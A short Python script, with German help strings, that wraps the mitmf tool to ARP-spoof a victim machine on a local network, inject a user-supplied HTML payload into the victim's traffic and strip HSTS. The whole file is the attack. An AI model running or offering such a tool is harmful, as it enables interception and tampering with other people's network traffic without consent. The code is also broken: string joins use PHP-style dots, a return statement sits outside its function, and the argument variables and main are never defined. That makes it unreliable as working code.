import os
import argparse

def parse_args():

    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="IP Adress des Opfers. Beispiel: -v 192.168.0.10")
    parser.add_argument("-r", "--routerIP", help="IP Adresse des Gateway. Beispiel: -r 192.168.0.1")
    parser.add_argument("-p", "--payLoad", help="Payload to inject.")

return parser.parse_args()

os.system('mitmf --spoof --arp -i wlan0 --gateway ' . routerIP . ' --target ' . victimIP . ' --inject --html-payload "' . payLoad . '" --hsts')

main(parse_args())
